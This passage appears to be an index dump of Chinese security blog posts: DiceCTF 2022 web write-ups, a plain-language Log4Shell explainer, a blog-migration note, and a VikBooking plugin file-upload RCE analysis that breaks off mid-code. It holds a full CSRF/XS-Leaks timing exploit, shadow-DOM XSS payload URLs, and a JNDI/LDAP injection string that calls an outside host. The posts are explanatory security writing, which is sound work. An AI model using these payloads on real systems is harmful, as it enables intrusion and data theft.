map[key][i] = _inspect(item[key]); &#125; &#125; &#125; 所以透過這個方式，可以污染 Object.prototype[0]，讓它變成空字串。 看來應該要 follow 一下 Node.js security updates，感覺滿多有用的資訊。 web&#x2F;noteKeeper(2 solves)這題當時沒仔細看，先放著未來有機會再研究：https://brycec.me/posts/dicectf_2022_writeups#notekeeper web&#x2F;dicevault(2 solves)這題也沒仔細看，只知道是致敬另外一題：http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html 作者解答：https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#webdicevault web&#x2F;carrot(1 solves)這題也很有趣，是個很簡單的 service，可以新增 note 跟搜尋，畫面如下： 搜尋的時候會搜尋內容，有的話就會顯示，後端程式碼如下： @app.route('/tasks') def tasks(): if 'username' not in session: return redirect('/') tasks = db.get(session['username'])['tasks'] if 'search' in request.args: search = request.args['search'] tasks = list(filter(lambda task: search in task['content'], tasks)) tasks = list(sorted(tasks, key=lambda task: -task['priority'])) return render_template('tasks.html', tasks=tasks) flag 藏在 admin note 裡面，在啟動時會自動建立： if not has('admin'): password = config.ADMIN_PASSWORD put('admin', &#123; 'tasks': [&#123; 'title': 'flag', 'content': os.getenv('FLAG', default='dice&#123;flag&#125;'), 'priority': 1, 'id': 0 &#125;], 'password': bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode('utf-8') &#125;) 從 admin bot 的行為跟其他觀察看起來，就是個 XS-Leaks 的題目，只要能觀測到 search 的結果有沒有 flag 就行了，但難就難在想不出怎麼觀測。 這題官方沒有釋出而且似乎不會釋出解答（既然不釋出，可能是 Chrome 0 day 或是某個還沒修的 bug？），但賽後討論有人給了 XS-Leaks 的 exploit: https://gist.github.com/kunte0/47c2b53535605d842f984e77d6c63eed 完整程式碼： &lt;h1>DiceCTF 2022 web/carrot&lt;/h1> &lt;p>Step 1: CSRF the admin user, to set a super long title for the flag note (LAX + POST form only possible for 2 minutes after cookies is created)&lt;/p> &lt;button onclick=\"csrf()\">do csrf&lt;/button> &lt;p>Step 2: XS-Search with &lt;a href=\"https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/\">connection-pool timing leak&lt;/a>, we have to use window.open (LAX cookie)&lt;/p> &lt;button onclick=\"popunder()\">open popup&lt;/button> &lt;button onclick=\"exhaust_sockets()\">open 255 connections&lt;/button> &lt;button onclick=\"oracle('dice&#123;abc')\">test search \"abc\" (slow)&lt;/button> &lt;button onclick=\"oracle('dice&#123;xxx')\">test search \"xxx\" (fast)&lt;/button> &lt;br> &lt;br> &lt;h2 id=output>&lt;/h2> &lt;br> &lt;form id=x action=\"\" method=\"POST\" style=\"display:none;\"> &lt;input type=\"text\" name=\"title\" placeholder=\"title\"> &lt;br>&lt;br> &lt;input type=\"number\" name=\"priority\" placeholder=\"priority\" value=9999> &lt;br>&lt;br> &lt;textarea name=\"content\" placeholder=\"content\" rows=\"5\" cols=\"20\">&lt;/textarea> &lt;br>&lt;br> &lt;input type=\"submit\" value=\"submit\"> &lt;/form> &lt;script> // this is send is used as logging LOG = 'Starting' // 255 in normal chrome, 99 in headless SOCKETLIMIT = 255; // default TIMELIMIT = 800; INSTANCE = '' MYSERVER = `example.com` const sleep = (ms) => &#123; return new Promise(resolve => &#123; setTimeout(resolve, ms); &#125;); &#125; const time_fetch = async() => &#123; let test_server_url = `https://$&#123;MYSERVER&#125;/?$&#123;LOG&#125;`; let start = window.performance.now(); try &#123; await fetch(test_server_url, &#123; mode: 'no-cors' &#125;); &#125; catch (e) &#123; console.log(e); &#125; let end = window.performance.now(); return end - start; &#125; const fetch_sleep_long = (i) => &#123; // 40s sleep return fetch(`https://$&#123;i&#125;.$&#123;MYSERVER&#125;/40sleep`, &#123; mode: 'no-cors' &#125;); &#125; const fetch_sleep_short = (i) => &#123; // 0.25s sleep return fetch(`https://$&#123;i&#125;.$&#123;MYSERVER&#125;/ssleep`, &#123; mode: 'no-cors' &#125;); &#125; const block_socket = async (i) => &#123; fetch_sleep_long(i); // needed? await sleep(0); &#125; const exhaust_sockets = async() => &#123; let i = 0 for (; i &lt; SOCKETLIMIT; i++) &#123; block_socket(i); &#125; console.log(`Used $&#123;i&#125; connections`); &#125; const timeit = async (url, popup) => &#123; return new Promise(async (r) => &#123; popup.location = url; // needed? await sleep(50) let val = await time_fetch() r(val) &#125;); &#125; // const alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-&#125;!\"#$%&amp;\\'()*+,-./:;&lt;=>?@[\\\\]^`|~&#123;'.split(''); const alphabet = 'abcdefghijklmnopqrstuvwxyz&#125;_'.split(''); // const alphabet = 'abcdef&#125;'.split(''); const oracle = async (search) => &#123; let url = `https://carrot-$&#123;INSTANCE&#125;.mc.ax/tasks?search=$&#123;search&#125;` let t = await timeit(url, WINBG) LOG = `$&#123;search&#125;:$&#123;t&#125;` console.log(`$&#123;search&#125;:$&#123;t&#125;`) return t > TIMELIMIT &#125; const brute = async (flag) => &#123; for (const char of alphabet) &#123; if (await oracle(flag + char)) &#123; return char; &#125; &#125; return false; &#125; const calibrate = async () => &#123; return new Promise(async (r) => &#123; // slow let url1 = `https://carrot-$&#123;INSTANCE&#125;.mc.ax/tasks?search=dice&#123;` let t1 = await timeit(url1, WINBG) console.log(`slow:$&#123;t1&#125;`) // fast let url2 = `https://carrot-$&#123;INSTANCE&#125;.mc.ax/tasks?search=XXXXXXXXXX` let t2 = await timeit(url2, WINBG) console.log(`fast:$&#123;t2&#125;`) return r((t1 + t2) / 2) &#125;); &#125; const exploit = async(flag = '') => &#123; console.log('Starting') // dont go to fast plz :) console.log(`waiting 3s`) await sleep(3000) // exaust sockets await exhaust_sockets() await sleep(2000) LOG = `Calibrating` TIMELIMIT = await calibrate() LOG = `TIMELIMIT:$&#123;TIMELIMIT&#125;` console.log(`timelimit:$&#123;TIMELIMIT&#125;`) await sleep(2000) let last; while (true) &#123; last = await brute(flag); if (last === false) &#123; return flag; &#125; else &#123; flag += last; output.innerText = flag; if(last === '&#125;')&#123; return flag &#125; &#125; &#125; &#125; const popunder = () => &#123; if (window.opener) &#123; WINBG = window.opener &#125; else &#123; WINBG = window.open(location.href, target=\"_blank\") location = `about:blank` &#125; &#125; const csrf = async () => &#123; x.action = `https://carrot-$&#123;INSTANCE&#125;.mc.ax/edit/0` x.title.value = \"A\".repeat(1000000) x.submit() &#125; window.onload = () => &#123; let p = new URL(location).searchParams; if(!p.has('i'))&#123; console.log(`no INSTANCE`) return &#125; INSTANCE = p.get('i') // step 1 if(p.has('csrf'))&#123; csrf() return &#125; // step 2 if (p.has('exploit')) &#123; // window open is ok in headless :) popunder() exploit('dice&#123;') &#125; &#125; &lt;/script> 簡單來說可以先用 CSRF 去改 admin note 的 title，改成一個超級長的字串，因為 jinja2 render 會變慢，所以 response time 就會增加。 再來就是 timing attack 了，上面的 exploit 用的是 connection pool，先把瀏覽器的 connection pool 塞到只剩下一個，這時候就剩下一個 connection 可以用了。 這時候我們用新的 window 去造訪 search 的 URL（稱作 reqSearch 好了），與此同時再發一個 request 到我們自己的 server（我們叫做 reqMeasure），因為只有一個 connection 可以用，所以 reqMeasure 從發出 request 到收到 response 的時間，就是 reqSearch 花的時間 + reqMeasure 花的時間，假設 reqMeasure 花的時間都差不多，那我們很容易可以測量出 reqSearch 花的時間。 可以測量時間之後，就可以慢慢暴力破解出 flag 的內容。 web&#x2F;shadow(0 solves)這題是純前端的題目，我們直接來看程式碼： &lt;!DOCTYPE html> &lt;html lang=\"en\">&lt;head> &lt;meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"> &lt;meta charset=\"UTF-8\"> &lt;title>shadow&lt;/title> &lt;/head> &lt;body> &lt;h3 id=\"title\">store your secrets here:&lt;/h3> &lt;div id=\"vault\">&lt;/div> &lt;div id=\"xss\">&lt;/div> &lt;script> // the admin has the flag set in localStorage[\"secret\"] let secret = localStorage.getItem(\"secret\") ?? \"dice&#123;not_real_flag&#125;\" let shadow = window.vault.attachShadow(&#123; mode: \"closed\" &#125;); let div = document.createElement(\"div\"); div.innerHTML = ` &lt;p>steal me :)&lt;/p> &lt;!-- secret: $&#123;secret&#125; --> `; let params = new URL(document.location).searchParams; let x = params.get(\"x\"); let y = params.get(\"y\"); div.style = y; shadow.appendChild(div); secret = null; localStorage.removeItem(\"secret\"); shadow = null; div = null; // free XSS window.xss.innerHTML = x; &lt;/script> &lt;/body>&lt;/html> 建立了一個 closed 的 shadow DOM，然後要你想辦法可以存取到裡面的內容。根據 MDN 的說法，closed 的意思是： closed: Denies access to the node(s) of a closed shadow root from JavaScript outside it: 所以用 JavaScript 沒辦法直接存取到程式碼，因為怎麼 query 都是 null。 因此這題的關鍵是特地留的一個 style injection：div.style = y;，你可以新增一些 CSS。 在做這題的時候我想說會不會是用 Houdini 然後自己實作一些 CSS 的自訂屬性或是排版規則，就可以拿到 DOM，但因為 CSP 跟執行順序的關係，應該是沒有辦法。 後來因為這題太久都沒人解開，主辦單位釋出了一個提示：「Hint 1: non-standard css properties might help you」 看到這個之後我就去 Google：non-standard css properties，然後有找到這個：Non-standard and Obsolete CSS Properties，並且實際去試了裡面幾個屬性，但都沒什麼幫助。 此時我突然好奇起 Chrome 到底支援哪些 CSS 屬性，於是就直接去找原始碼來看，找到這個：https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/css/CSSProperties.in （話說上面的是舊版，新版在這裡：third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;css&#x2F;css_properties.json5，相關說明在這裡：third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;style&#x2F;ComputedStyle.md） 我就一個一個看，看有沒有哪個比較特別的，就找到了 -webkit-user-modify 這個屬性，來看一下 MDN: https://developer.mozilla.org/en-US/docs/Web/CSS/user-modify 看起來這屬性就跟 contenteditable 差不多，既然變成 contenteditable，自然而然就會想到 document.execCommand，而這裡面有個 insertHTML 的指令，看起來很有機會。 於是我就在 console 上面試了半天，試了像是 document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img src=x onerror=console.log(this.parentNode)&#39;) 之類的東西，但是 console 顯示出 null，我想說可能不是這個解吧，於是到這邊就放棄了。 看了賽後的 writeup：https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md，發現其實我的方向完全是正確的，只是有兩個關鍵點沒找到。 第一個關鍵點是要先 focus 那段文字再執行 insertHTML，這個我之前有試過 .focus() 但沒用，第二個關鍵點是要用 svg 才能成功。 先放一下成功的 payload： https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;svg&#x2F;onload&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt; 先用 window.find 去 focus 內容之後，再執行 document.execCommand 去插入 HTML，然後透過 svg 的 event 去執行 JS 拿到節點 底下是幾個會失敗的 payload： &#x2F;&#x2F; 沒有 focus https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;svg&#x2F;onload&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt; &#x2F;&#x2F; 用了不是 svg 的元素，會讀不到 this.parentNode https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img&#x2F;src&#x3D;x+onerror&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt; 但神奇的事情是，如果在前面先加上 document.exec(&#39;selectAll&#39;)，就可以： https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;selectAll&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img&#x2F;src&#x3D;x+onerror&#x3D;alert(this.parentNode.parentNode.innerHTML)&gt;&#39;)&quot;&gt; 為什麼會有這個差異呢？我也不知道，解出來的人似乎也不知道XD 除了學到 window.find 這個神奇的 API 以外，從 Discord 的賽後討論也學到了另一個隱藏 API：document.execCommand(&#39;findString&#39;, false, &#39;steal&#39;)，他們說是從 Chromium source code 裡面看到的：https://chromium.googlesource.com/chromium/src/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/editing/commands/editor_command_names.h#35 這邊留下三個坑，未來有機會再補： 研究一下所有 document.execCommand 可以執行的指令 研究一下所有 global function 研究一下所有 Chrome 支援的 CSS 屬性 總結雖然 10 題裡面只打出 1 題 web，但還是收穫滿滿，筆記一下這次學到的新知識： Node.js 會把模組用 function 包起來 不能用 import &quot;fs&quot; 但可以用 import(&quot;fs&quot;).then() JS 有些字元轉大小或小寫之後長度會變 RegExp.input 也就是 RegExp.$_，可以拿到最後比對的輸入 &lt;svg&gt;&lt;svg onload=alert()&gt; 是同步執行的，這個真的神奇 可以把 connection pool 塞滿來執行 timing attack -webkit-user-modify 可以做到跟 contenteditable 差不多的事情 window.find 跟 document.execCommand(&#39;findString&#39;, false, &#39;steal&#39;) 可以反白選取相對應字串 感覺這次學到的技巧其他 CTF 也很有機會派上用場。","link":"/2022/02/08/what-i-learned-from-dicectf-2022/"},{"title":"從監視攝影機理解 Log4j 跟 Log4Shell 漏洞","text":"2021 年末資安界最大的新聞莫過於 Log4j 的漏洞，編號為 CVE-2021-44228，又被稱為 Log4Shell，甚至被一些人形容為「核彈級漏洞」，可見這個漏洞的影響程度之深遠。 關於技術上的分析已經有很多篇文章在講解了，但對於不懂技術的人來說，可能只知道這個漏洞很嚴重，卻不知道為什麼嚴重，也不知道原理到底是什麼，因此我想從讓非技術背景的人也能理解的角度出發，寫一篇比較白話的文章。 從監視攝影機談起我有個朋友叫小明，他家是開雜貨店的。就跟其他商店一樣，在店裡有一支監視攝影機，怕有什麼消費糾紛或是有人來搶劫或偷東西，因此讓攝影機 24 小時全程錄影，真的發生什麼事了，就會有證據留存下來。 但攝影機的鏡頭角度有限，不可能把整間店面的影像都拍下來，就算真的都拍下來了，要存的資料也會太多（除非小明很有錢，買了一堆攝影機）。因此，攝影機只會對準一些非常重要、值得記錄下來的地方，像是收銀台等等。 原本這支攝影機用了十幾年都沒什麼事情，畢竟不就是把影像記錄起來嗎，能有什麼事情？但最近卻突然有人發現一個攝影機的隱藏功能（嚴格來講不是隱藏功能，因為攝影機的說明書上其實有提到，可是大家都懶得看那一百多頁的說明書，所以很少人知道這個功能） 這個功能是什麼呢？那就是除了錄影以外，這台監視攝影機還有個智慧圖片辨識的功能，如果它看到特定的影像，會根據影像的內容去執行相對應的動作。舉例來說好了，這個圖片辨識功能需要把指令寫在 100x100 的板子上，一定要黑底白字加上特定格式，像這個樣子： 當攝影機看到上面的圖，符合特定格式，就執行了上面的指令：「關機」，就真的關機了！但關機還沒什麼，指令還可以寫說「把攝影機資料全都給我」之類的，再者，攝影機本來就會即時連線到其他伺服器，這個指令也可以對那些伺服器做操作，例如說把上面的資料全都偷下來等等。 總之呢，一旦讓攝影機拍到指定格式的東西，就會幫你執行指令。 這個功能被爆出來以後，血流成河，因為太多地方都有監視攝影機了，因此許多人都帶著這個板子去看看會不會觸發這個功能。攝影機有分型號，只有一台叫做 log4j 的攝影機會出事，其他不會，但要注意的事情是有些攝影機它雖然不叫做這名字，可其實是從 log4j 作為基底改出來的，就一樣會出事。 而有些東西儘管不是攝影機也會出事，例如說有台智慧冰箱，號稱內部有微型攝影機可以即時監控冰箱內部狀況，恰巧這個微型攝影機就是 log4j 這個型號的攝影機改版出來的，所以也有同樣的問題。 你想想看，如果監視攝影機出了這個問題，那全台灣、全世界這麼多人用這個型號的監視攝影機，當然會引起軒然大波，只要讓攝影機拍到特定的東西就會執行指令，這可嚴重了。 以上是對於 log4j 漏洞的簡單比喻，在這個故事中雜貨店就像是你的網站，而攝影機的功能就是拿來紀錄（log）對於網站的那些請求（request），整個故事只要記兩個重點就好： log4j 是拿來記錄東西用的 漏洞原理是只要紀錄某些特定格式的文字，就會觸發一個功能可以執行程式碼 白話的簡易比喻到這邊先結束，想要更了解 log4j，我們就必須先來看看什麼是 log。 有關於 log 這件事log 的中文翻譯叫做日誌，我相信許多人對這個名詞並不陌生，如果你有跟工程師合作過，他在解決問題時可能會說：「我去看一下 log」；或是如果你們跟合作廠商各執一詞，他說 A 你們說 B，這時候就會說：「不然看一下 log 吧，看看是誰的問題」 當你跟公司的 IT 合作解決電腦上的小問題時，他也會跟你說要去某個地方複製 log 給他，他才知道發生了什麼事情。 log 就像是一台 24 小時全年無休的監視攝影機一樣，需要紀錄起重要事物的狀況。 那為什麼需要有 log 呢？這問題就像是「為什麼要有監視攝影機？」一樣，答案很簡單，因為出事的時候才有證據。就像行車記錄器一樣，裝了以後若不幸發生車禍，就可以協助判斷肇責。 舉個例子，假設我是 A 公司，我們公司是做購物網站的，而通常金流這一塊並不會自己做，而是會找其他做金流的廠商合作，在後端去「串接」金流服務商提供的功能，講白話一點就是：「當使用者要付款時，我把使用者導過去金流廠商的頁面，付款完再導回來我們網站」，相信有在網路上購物的大家應該很熟悉這個流程。 在這個過程中，雙方都必須留下紀錄，確保未來發生問題時有證據可以輔助說明。 例如說有天 A 公司突然接到一堆客訴說沒辦法付款，這時 A 公司直接打電話去金流商，罵說你們這什麼爛服務，怎麼突然壞掉，而金流商此時提供了伺服器的 log，說：「沒有啊，我們這邊從今天早上八點開始就沒有你們導過來的紀錄了，應該是你們的問題吧？」，後來 A 公司檢查了自己這邊的服務，確實是因為今天早上的版本更新出了問題而導致，跟金流商一點關係都沒有。 這就是 log 的重要性，當出事的時候你才有證據可以盤查，才能盡可能還原當初的狀況。 做開發者的大家都知道 log 很重要，所以 log 基本上是必備的，以網站後端來說，他可能會在交易發生錯誤時留下一筆 log，也有可能在發生非預期錯誤時寫下 log，或是用 log 紀錄 request 中的一些欄位，比如說瀏覽器版本好了，給自己公司內部的數據分析系統來使用。 因此 log 是個十分常見的功能。這也是為什麼如果這個功能出事了，造成的後果會非常嚴重。 log4j 是什麼？在寫網站後端的程式碼時，會有不同的程式語言可以選擇，例如說 Python、JavaScript、PHP 或是 Java 等等，而這些程式語言都會有些專門做 log 的套件，簡單來說就是有人已經幫你把功能都寫好了，你只要用就好了。 而 Java 有一個很好用的 log 套件，就叫做 log4j。而這個套件是隸屬於 Apache 軟體基金會底下，因此全名又叫做 Apache Log4j。 Apache 底下有很多不同的軟體跟套件，例如說： Apache HTTP Server（大家最常看到的是這個） Apache Cassandra Apache Tomcat Apache Hadoop Apache Struts … 所以 Apache Server 跟 Apache log4j 完全是不同的兩個東西，我知道你用 Apache Server，跟你有沒有用 log4j 是兩件事情。 這次出問題的套件就是 log4j，而出問題的原因跟我開頭講的一樣，有一個鮮為人知的功能有著安全性的漏洞，只要 log4j 在記錄 log 時記錄到某個特定格式的東西，就會去執行相對應的程式碼，就像開頭提的那個「關機」的板板一樣。 再講更詳細一點，其實並不是直接執行程式碼，那一段特定格式長得像這樣： $&#123;jndi:ldap:&#x2F;&#x2F;cymetrics.io&#x2F;test&#125; 先不要管那些你看不懂的字，你可以很明顯看到裡面有一段東西很像網址，對，它就是網址，當 log4j 紀錄上面那一串字的時候，它發現這串字符合特定格式，就會去裡面的網址（cymetrics.io/test）下載程式碼然後執行，因此這是一個 RCE（Remote Code Execution，遠端程式碼執行）漏洞。 前面我有提過後端會記錄許多東西，假設今天有個後端服務是用 Java 寫的，而它用 log4j 記錄了使用者登入失敗時輸入的帳號，這時我只要用 $&#123;jndi:ldap://cymetrics.io/test&#125; 這個帳號登入，就能夠觸發 log4j 的漏洞，讓它執行我準備好的程式碼。 只要能執行程式碼，我就可以做很多事情，例如說把伺服器上的資料偷走，或是安裝挖礦軟體幫我挖礦等等。 為什麼這個漏洞如此嚴重？第一，log4j 這個套件使用的人數極多，只要你有用 Java，幾乎都會用這個套件來紀錄 log 第二，觸發方式容易，你只要在 request 的各個地方塞滿這些有問題的字串，server 只要有記錄下來其中一個，就能夠觸發漏洞，而前面我們有提到紀錄 log 本來就是家常便飯的事情 第三，能造成的影響極大，漏洞被觸發之後就是最嚴重的 RCE，可以直接執行任意程式碼 結合以上這三點，讓它成了一個核彈級的漏洞。到底有多嚴重，看看這些新聞標題就知道： Apache Log4j 漏洞影響巨大，美國資安主管機關通令政府單位立即修復 微軟、蘋果都受波及！日誌框架Apache Log4j爆漏洞，堪稱近10年最大資安威脅 【Log4Shell漏洞資訊更新】Log4j 2.15.0修補不全、Apache再釋2.16.0新版，國家駭客已開始行動 還有一點差點忘了提，有許多其他的軟體也都用了 log4j 這個套件，因此也會有問題，國外有人整理出一份被影響的清單：Log4Shell log4j vulnerability (CVE-2021-44228 &#x2F; CVE-2021-45046) - cheat-sheet reference guide，洋洋灑灑一大片，像是 Minecraft 這個遊戲的伺服器也有用到 log4j，所以也被這個漏洞給影響。 該怎麼知道我有沒有被這個漏洞影響？可以先確認自己家的程式有沒有用到 log4j 這個套件以及套件的版本，也需要一併檢查有沒有使用上面那張清單列出來的其他軟體。 如果你是工程師，也可以用一些現有的工具檢測是否受到漏洞影響，像是：log4j-scan 或是 jfrog 提供的 log4j-tools 等等。 或如果真的不知道該如何處理，也可以聯絡我們，看我們可以怎樣幫助你。 該如何修補？由瑞士 CERT 發表的這篇文章：Zero-Day Exploit Targeting Popular Java Library Log4j 中，有給了一張從各個環節去防禦的圖： 如果來不及把根本原因修掉，可以先上 WAF（Web Application Firewall），簡單來說就是針對網站的防火牆，把那些惡意的字串擋掉，例如說 Cloudflare 就在第一時間增加了 WAF 的規則加以阻擋，不過也有很多人在研究怎麼繞過 WAF 的規則，因此這是治標不治本的做法。 治本的方法就是把 log4j 停用或是升版，升級到不會被這個漏洞影響的版本，但有些時候第一時間的改版可能沒有把漏洞完全補掉，因此記得更新完以後還是要密切注意是否有更新的版本。例如說在這篇文章寫完後過沒多久，官方就釋出了第三個 patch 修復其他相關問題：Apache Issues 3rd Patch to Fix New High-Severity Log4j Vulnerability 結語一個很多人用的套件，加上一個很常見的功能，再加上一個很簡單的攻擊方式以及嚴重的後果，就成了一個可以被載入史冊的漏洞。 文中有些比喻為了不要講得太細節，會是精簡過後的版本，不一定能完全涵蓋本來的漏洞，在轉換成故事比喻的過程中一定會有一些遺漏的部分，但對於整體的理解我覺得影響不大。 如果你想了解更技術的細節以及時間軸，很推薦這一支影片：Hackers vs. Developers &#x2F;&#x2F; CVE-2021-44228 Log4Shell，裡面講得很清楚，也探討了開發者與資安從業人員的關係。 最後，希望這篇文章能讓不懂技術的大家更了解 log4shell 是怎樣的漏洞，以及這個漏洞為什麼如此嚴重。文中若有錯誤也請不吝留言指正，感謝。","link":"/2021/12/18/what-is-log4j-and-log4shell/"},{"title":"從 GitHub Issues 搬回 Hexo","text":"大約在一年前的時候，我把 Blog 直接放在 GitHub Issues 上面。雖然說台灣很少人這樣做，但有許多中國的開發者都利用這個方式來架 Blog。 那時我會想採用 GitHub Issues 的原因很簡單，就是因為方便。 GitHub Issues 完美支援 Markdown 語法。 上傳圖片超方便 當別人也用 Issues 提到你的文章時，會自動產生 reference 留言系統超方便 可以按 Emoji GitHub repo 可以按 watch 來關注，更新時會收到通知 總結以上，當時選擇了 GitHub Issues。 但最近發現一個很大的問題，當初沒有注意到，那就是 GitHub Issues 的 SEO 極差。你直接拿 Issue 的標題去 Google 搜尋，還不一定能搜得到。 因為這問題挺大的，所以最後還是搬回了 Hexo。 在兩年前其實我就已經搬過一次家了，從 Logdown 搬到 Hexo 去。但那時我沒有繼續使用 Hexo，因為我覺得那個部落格的版面不太好看。 而這次重新搬回來，很大一部分是因為看到了 Askie Lin 的部落格，我看到的時候驚為天人，想說：「哇，這部落格也做得太漂亮了吧！」，後來得知是使用現成的主題 Minos 來改的，於是我就想說可以換成這個主題試試看。 今天經過一整天的調整，自己修了滿多東西，試著把這個版型修成自己想要的樣子，發現還滿順利的。可能是因為原本的 code 就寫得不錯，基本上修起來沒有太大問題，改了一下字體大小以及分類跟文章列表顯示的樣子，其他都沒什麼動。 沒什麼意外的話，以後就決定在這邊紮根了，原本 GitHub 那邊就當作備份文章的地方好了。 Hexo 萬歲，Minos 萬歲 🎉","link":"/2019/09/25/why-move-from-github-issue/"},{"title":"WordPress Plugin VikBooking <= 1.5.3 Unauthorized RCE 漏洞細節","text":"前陣子在看一些 WordPress Plugin 的東西，發現是個滿好練習的地方，因為那邊 plugin 數量很多，而且每一個都有原始碼可以看，想要黑箱白箱都可以，然後安裝也很方便。 這篇來講一下前陣子找到的一個洞，用的是最基本而且經典的攻擊手法，檔案上傳導致的 RCE。 漏洞編號：CVE-2022-27862 WordPress VikBooking Hotel Booking Engine &amp; PMS plugin &lt;&#x3D; 1.5.3 - Arbitrary File Upload leading to RCE VikBooking 簡介與漏洞細節VikBooking 是個 WordPress 的訂房外掛，官網的 demo 長這樣： 就跟其他的訂房外掛其實沒有什麼區別，完成訂房以後管理員在 WordPress 後台可以管理訂單，而消費者也會收到一封信，可以透過信件中提供的網址來管理自己的訂房： 雖然說 UI 上看起來沒什麼東西，但既然我們有了原始碼，就可以透過白箱測試的方式去看一下裡面的實作為何。 主要的操作跟邏輯都放在 site/controller.php 當中，裡面每一個 function 基本上都對應到一個 action，其中我發現了一個方法叫做 storesignature，程式碼如下： public function storesignature() &#123; $sid = VikRequest::getString('sid', '', 'request'); $ts = VikRequest::getString('ts', '', 'request'); $psignature = VikRequest::getString('signature', '', 'request', VIKREQUEST_ALLOWRAW); $ppad_width = VikRequest::getInt('pad_width', '', 'request'); $ppad_ratio = VikRequest::getInt('pad_ratio', '', 'request'); $pitemid = VikRequest::getInt('Itemid', '', 'request'); $ptmpl = VikRequest::getString('tmpl', '', 'request'); $dbo = JFactory::getDBO(); $mainframe = JFactory::getApplication(); $q = \"SELECT * FROM `#__vikbooking_orders` WHERE `ts`=\" . $dbo->quote($ts) . \" AND `sid`=\" . $dbo->quote($sid) . \" AND `status`='confirmed';\"; $dbo->setQuery($q); $dbo->execute(); if ($dbo->getNumRows() &lt; 1) &#123; VikError::raiseWarning('', 'Booking not found'); $mainframe->redirect('index.php'); exit; &#125; $row = $dbo->loadAssoc(); $tonight = mktime(23, 59, 59, date('n'), date('j'), date('Y')); if ($tonight > $row['checkout']) &#123; VikError::raiseWarning('', 'Check-out date is in the past'); $mainframe->redirect('index.php'); exit; &#125; $customer = array(); $q = \"SELECT `c`.*,`co`.`idorder`,`co`.`signature`,`co`.`pax_data`,`co`.`comments` FROM `#__vikbooking_customers` AS `c` LEFT JOIN `#__vikbooking_customers_orders` `co` ON `c`.`id`=`co`.`idcustomer` WHERE `co`.`idorder`=\".(int)$row['id'].\";\"; $dbo->setQuery($q); $dbo->execute(); if ($dbo->getNumRows() > 0) &#123; $customer = $dbo->loadAssoc(); &#125; if (!(count($customer) > 0)) &#123; VikError::raiseWarning('', 'Customer not found'); $mainframe->redirect('index.php'); exit; &#125; //check if the signature has been submitted $signature_data = ''; $cont_type = ''; if (!empty($psignature)) &#123; //check whether the format is accepted if (strpos($psignature, 'image/png') !== false || strpos($psignature, 'image/jpeg') !== false || strpos($psignature, 'image/svg') !== false) &#123; $parts = explode(';base64,', $psignature); $cont_type_parts = explode('image/', $parts[0]); $cont_type = $cont_type_parts[1]; if (!empty($parts[1])) &#123; $signature_data = base64_decode($parts[1]); &#125; &#125; &#125; $ret_link = JRoute::rewrite('index.php?option=com_vikbooking&amp;task=signature&amp;sid='.$row['sid'].'&amp;ts='.$row['ts'].(!empty($pitemid) ? '&amp;Itemid='.$pitemid : '').($ptmpl == 'component' ? '&amp;tmpl=component' : ''), false); if (empty($signature_data)) &#123; VikError::raiseWarning('', JText::translate('VBOSIGNATUREISEMPTY')); $mainframe->redirect($ret_link); exit; &#125; //write file $sign_fname = $row['id'].'_'.$row['sid'].'_'.$customer['id'].'.'.$cont_type; $filepath = VBO_ADMIN_PATH . DIRECTORY_SEPARATOR . 'resources' . DIRECTORY_SEPARATOR . 'idscans' . DIRECTORY_SEPARATOR . $sign_fname; $fp = fopen($filepath, 'w+'); $bytes = fwrite($fp, $signature_data); fclose($fp); if ($bytes !== false &amp;&amp; $bytes > 0) &#123; //update the signature in the DB $q = \"UPDATE `#__vikbooking_customers_orders` SET `signature`=\".$dbo->quote($sign_fname).\" WHERE `idorder`=\".(int)$row['id'].\";\"; $dbo->setQuery($q); $dbo->execute(); $mainframe->enqueueMessage(JText::translate('VBOSIGNATURETHANKS')); //resize image for screens with high resolution if ($ppad_ratio > 1) &#123; $new_width = floor(($ppad_width / 2)); $creativik = new vikResizer(); $creativik->proportionalImage($filepath, $filepath, $new_width, $new_width); &#125; // &#125; else &#123; VikError::raiseWarning('', JText::translate('VBOERRSTORESIGNFILE')); &#125; $mainframe->redirect($ret_link); exit; &#125; 從 function name 跟程式碼可以推測出應該是一個上傳簽名檔案的功能，而檔案的內容會先 base64 過，所以程式碼中 decode 回 binary 然後寫進檔案，核心的程式碼如下： $psignature = VikRequest::getString('signature', '', 'request', VIKREQUEST_ALLOWRAW); //check if the signature has been submitted $signature_data = ''; $cont_type = ''; if (!empty($psignature)) &#123; //check whether the format is accepted if 